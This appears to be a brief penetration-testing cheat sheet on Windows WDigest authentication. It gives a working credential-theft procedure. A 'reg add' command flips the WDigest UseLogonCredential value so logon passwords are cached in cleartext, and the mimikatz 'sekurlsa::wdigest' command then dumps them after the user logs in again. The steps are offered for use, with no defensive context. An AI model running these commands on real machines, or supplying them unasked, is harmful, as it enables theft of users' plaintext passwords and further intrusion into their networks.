# Wdigest Clear Text

Digest Authentication is a challenge/response protocol that was primarily used in Windows Server 2003 for LDAP and web-based authentication. It utilizes Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges to authenticate. At a high level, a client requests access to something, the authenticating server challenges the client, and the client responds to the challenge by encrypting its response with a key derived from the password. The encrypted response is compared to a stored response on the authenticating server to determine if the user has the correct password.

#### <mark style="color:green;">It is still possible, however, to force WDigest to store secrets in plaintext.</mark>

```shell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

after this, we have to wait for the user to log back in one more time so the clear text creds are stored in memory.

dump wdigest with mimikatz:

```css
sekurlsa::wdigest
```
